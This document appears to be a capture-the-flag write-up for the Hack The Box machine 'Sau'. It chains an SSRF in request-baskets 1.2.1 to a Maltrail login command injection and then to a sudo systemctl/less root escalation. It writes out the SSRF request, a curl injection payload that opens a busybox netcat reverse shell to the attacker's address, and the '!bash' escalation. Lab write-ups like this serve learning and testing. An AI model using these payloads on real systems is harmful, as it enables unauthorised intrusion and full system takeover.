We add the machine to /etc/hosts:
	
	sudo su
	echo "10.10.11.224	sau.htb" >> /etc/hosts

We start the machine with a classical nmap scan (i started rustscan but didn't find much):
	
	nmap -p- sau.htb
output:
	
	PORT	STATE
	22 		open
	80		filtered
	8338	filtered
	55555	open
the two filtered ports are weired but for now we can't access them, better to continue enumerate...
we can visit the site on port 55555
we found a web service that permit us to create web basket.
The web site is hosted by this service:
	
	Powered by request-baskets | Version: 1.2.1
we can find an exploit online for this version;
in fact this site has already had a SSRF vulnerability when we create a basket.
The site permit us to choose the url to see when we visit the basket; we can set this whit a similar
request:
	
	POST /api/baskets/new_basket
	{	
		"forward_url":"http://127.0.0.1:8338/",
		"proxy_response":true,
		"insecure_tls":false,
		"expand_path":true,
		"capacity":200
	}
now we've created a basket that redirect us to the port that we couldn't see before.
When we visit the site we are redirected to a strange html page of "maltrail";
i didn't know this service so i googled it.
"Maltrail is an open-source network threat detection system that analyzes abnormal traffic and identifies potential cyber attacks." CHAT-GPT

so i searched for some exploit for this service and found this:
	
	https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/
the poc is simple:
	
	curl 'http://hostname:8338/login' --data 'username=;`id > /tmp/bbq`'
we can pass commands in the username field because the paramether is checked with
a subprocess.check_output().

we can modify the payload as follow to adapt it to our basket and settings:
	
	curl http://sau.htb:55555/new_basket/login --data 'username=;`busybox nc 10.10.14.239 4444 -e bash`'
the command execution was limited to some commands in fact only busybox netcat worked for me (maybe sth else will work)
to recive the revshell we need to start a listener (i use pwncat):
	
	python3 -m pwncat -lp 4444
WE ARE IN AS USER!
we submit the userflag and keepgoing.
we need to keep on with the enumeration and privesc(is actually pretty ez):
	
	sudo -l
output:
	
	(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
we can run the command as admin so i tried to search for systemctl exploit and i found this:
	
	https://gtfobins.github.io/gtfobins/systemctl/
the exploit is pretty simple and i leverage the fact that the systemctl is opened with less,
so we can use a classical less privesc (the script is runned as root with no password):
	
	sudo /usr/bin/systemctl status trail.service
(inside the interactiv less prompt we need to write):
	
	!bash
WE ARE NOW ROOT!!
